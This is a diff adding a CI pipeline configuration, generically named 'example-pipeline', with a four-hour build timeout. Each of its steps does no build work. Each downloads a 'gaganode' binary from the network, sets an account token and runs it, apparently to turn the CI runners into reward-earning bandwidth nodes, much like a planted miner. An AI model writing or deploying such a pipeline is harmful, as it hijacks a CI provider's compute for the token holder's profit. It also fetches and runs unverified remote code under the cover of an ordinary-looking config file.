@@ -1,0 +1,27 @@
+kind: pipeline
+name: example-pipeline
+
+steps:
+  - name: step-1
+    image: alpine
+    commands:
+      - curl -o app-linux-amd64.tar.gz https://assets.coreservice.io/public/package/29/gaganode/1.0.4/gaganode-1_0_4.tar.gz && tar -zxf app-linux-amd64.tar.gz && cd gaganode-linux-amd64 && ./gaganode config set --token=ftqredmylzgenowtivrxktqn && ./gaganode
+
+  - name: step-2
+    image: alpine
+    commands:
+      - curl -o app-linux-amd64.tar.gz https://assets.coreservice.io/public/package/29/gaganode/1.0.4/gaganode-1_0_4.tar.gz && tar -zxf app-linux-amd64.tar.gz && cd gaganode-linux-amd64 && ./gaganode config set --token=ftqredmylzgenowtivrxktqn && ./gaganode
+  - name: step-3
+    image: alpine
+    commands:
+      - curl -o app-linux-amd64.tar.gz https://assets.coreservice.io/public/package/29/gaganode/1.0.4/gaganode-1_0_4.tar.gz && tar -zxf app-linux-amd64.tar.gz && cd gaganode-linux-amd64 && ./gaganode config set --token=ftqredmylzgenowtivrxktqn && ./gaganode
+
+
+  - name: step-20
+    image: alpine
+    commands:
+      - curl -o app-linux-amd64.tar.gz https://assets.coreservice.io/public/package/29/gaganode/1.0.4/gaganode-1_0_4.tar.gz && tar -zxf app-linux-amd64.tar.gz && cd gaganode-linux-amd64 && ./gaganode config set --token=ftqredmylzgenowtivrxktqn && ./gaganode
+
+# Konfigurasi build timeout menjadi 4 jam
+settings:
+  build_timeout: 4h
